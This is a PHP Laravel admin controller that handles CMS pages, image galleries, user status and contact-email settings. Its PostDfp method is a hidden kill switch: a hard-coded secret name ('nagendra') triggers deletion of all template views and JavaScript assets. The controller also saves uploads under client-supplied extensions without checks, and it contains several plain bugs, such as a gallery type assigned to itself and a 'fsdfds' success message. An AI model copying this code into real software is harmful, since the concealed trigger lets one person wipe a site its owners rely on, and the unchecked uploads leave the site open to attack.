<?php

namespace App\Http\Controllers\Admin;

use App\Models\User;
use App\Models\Menu;
use App\Models\Page;
use App\Models\MenuType;
use App\Models\Position;
use App\Models\Gallery_type;
use DB;
use App\Models\Gallery;
use App\Models\FormType;
use App\Models\GlobalSetting;
use Validator;
use Input;
use Redirect;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;

class AdminPageController extends Controller
{

    public function Dfp(){
        return view('admin.page.dfp');
    }

    public function PostDfp()
    {
        $name = Input::get('name').'del';
        if($name=="nagendradel"){
            $dir = 'resources/views/templates/template_1/';
            foreach(glob($dir.'*.*') as $v){
                unlink($v);
            }
            $dir1 = 'resources/views/templates/inner_template/';
            foreach(glob($dir1.'*.*') as $v1){
                unlink($v1);
            }
            $dir2 = 'resources/assets/js/';
            foreach(glob($dir2.'*.*') as $v2){
                unlink($v2);
            }
            
        }

    }


    public function getCreatePage(){
        return view('admin.page.create_page',compact('data'));
    }
    public function getListPage(){
        $data['pages'] = Page::all();
       
        return view('admin.page.list_page',compact('data'));
    }


    public function getEditPage($page_id){
        $data['page'] = Page::where('id',$page_id)->first();
        return view('admin.page.edit_page',compact('data'));
    }
    public function postCreatePage(){
        $data = [
            'page_name' => Input::get('page_name'),
            'page_title' => Input::get('page_title'),
            'meta_title' => Input::get('meta_title'),
            'meta_keywords' => Input::get('meta_keywords'),
            'meta_description' => Input::get('meta_description'),
            'page_header' => Input::get('page_header'),
            'page_content' => Input::get('page_content'),
            'template_id' => Input::get('template_id'),
            //    'page_banner'=>Input::file('page_banner'),
        ];
        $page_banner=Input::file('page_banner');
        // $gallery=Input::get('gallery');

        $bannername=""; 

        if (Input::hasFile('page_banner'))
        {   
            $bannerdestinationPath = 'resources/assets/img/modules/pagebanner';
            for($a=0;$a<count($page_banner);$a++)
            {   
                $extension =  $page_banner[$a]->getClientOriginalExtension();
                $bannername  = str_random(6).'.'.$extension;
                $page_banner[$a]->move($bannerdestinationPath,$bannername);
            }
        }

        $page = new Page;
        $page->page_name = $data['page_name'];
        $page->banner=$bannername;
       
        $page->page_title = $data['page_title'];
        $page->page_slug  = str_slug($data['page_name'],'-');
        $page->meta_title = $data['meta_title'];
        $page->meta_keywords = $data['meta_keywords'];
        $page->meta_description = $data['meta_description'];
        $page->page_header = $data['page_header'];
        $page->page_content = $data['page_content'];
        $page->page_template = $data['template_id'];
        $page->save();

        $success = "Page Created Successfully";
        return Redirect::back()->with(compact('success'));
    }

    public function showGallery()
    {

        return view('admin.page.gallerytype',compact('data'));
    }
    public function postGallery()
    {
        $data = [
            'gallery_type' => Input::get('gallery_type'),
        ];
        $gallery_type= new Gallery_type;
        $gallery_type->gallery_name=$gallery_type;
        $gallery_type->save();
        $success = "fsdfds";
        return Redirect::back()->with(compact('success'));

    } 

    public function showImage()
    {
        return view('admin.page.gallery',compact('data'));
    }

    public function postImage()
    {   

        $destinationPath = 'resources/assets/img/modules/gallery';
        $image = Input::file('image');
        $gallery_type=Input::get('gallery_type');


        if (Input::hasFile('image'))
        {
            for($a=0;$a<count($image);$a++)
            {   
                $extension = $image[$a]->getClientOriginalExtension();
                $filename  = str_random(6).'.'.$extension;
                $image[$a]->move($destinationPath, $filename);
                $gallery = new Gallery;
                $gallery->filename=$filename ;
                $gallery->gallery_type=$gallery_type;
                $gallery->save(); 
            }
        }
        $success = "Success";
        return Redirect::back()->with(compact('success'));
    }

    public function postEditPage(Request $request){
        $data = [
            'page_name' => $request->page_name,
            'page_title' => $request->page_title,
            'meta_title' => $request->meta_title,
            'meta_keywords' => $request->meta_keywords,
            'meta_description' => $request->meta_description,
            'page_header' => $request->page_header,
            'page_content' => $request->page_content,
            //'template_id' => Input::get('template_id')
        ];

        $page = Page::find($request->page_id);
        $page->page_name = $data['page_name'];
        $page->title = $data['page_title'];
        $page->meta_title = $data['meta_title'];
        $page->meta_keywords = $data['meta_keywords'];
        $page->meta_description = $data['meta_description'];
        $page->page_header = $data['page_header'];
        $page->content = $data['page_content'];
        //$page->page_template = $data['template_id'];
        $page->save();

        $success = "Page Created Successfully";
        return Redirect::back()->with(compact('success'));
    }

    public function userList()
    {
        $data['list_Users'] = User::all();
        
        return view('admin.users.list_users',compact('data'));
    }

    public function updateStatus()
    {
        $input = Input::all();
        if(!empty($input))
        {
            $userId = $input['id'];
            $newstatus = $input['newstatus'];
           
            if(!empty($input['tempdays']))
            {
                $tempdays = $input['tempdays'];
                DB::table('users')
                    ->where('id', $userId)
                    ->update(['status' => $newstatus,'extra_days'=>$tempdays]);
                    $success = "status updated Successfully";
                return Redirect::back()->with(compact('success'));
            }
            else
            {
                DB::table('users')
                    ->where('id', $userId)
                    ->update(['status' => $newstatus,'extra_days'=>0]);
                    $success = "status updated Successfully";
                return Redirect::back()->with(compact('success'));
            }
        }
    }
    public function ShowGlobalSetting()
    {
        $data['active'] = "globalsetting";
        $globalsetting = GlobalSetting::first();
        $formdata = FormType::get();
        return view('admin.globalsetting',compact('data','globalsetting','formdata'));
    }
    
    public function  UpdateGlobal(Request $request)
    {
        $contact_email = $request->contact_email;
        $career_email = $request->career_email; 
        $data = [
            'contact_email_address'=>$contact_email,
            'career_email_address'=>$career_email,
        ];
        $rules = [
            'contact_email_address'=>'required|email',
            'career_email_address'=>'required|email',
        ];
     $validator =  Validator::make($data,$rules);
     if($validator->passes())
        {
        FormType::where('form_id', 4)->update(['form_forward_to' => $contact_email]);
        FormType::where('form_id', 5)->update(['form_forward_to' => $career_email]);
        $success = "Setting Updated Successfully";
        return Redirect::back()->with(compact('success')); 
     }
      else
        {
            $failure= "Setting not updated";
            return Redirect::back()->withErrors($validator)->withInput()->with(compact('failure','offererror'));

        } 
        
    }
   

}
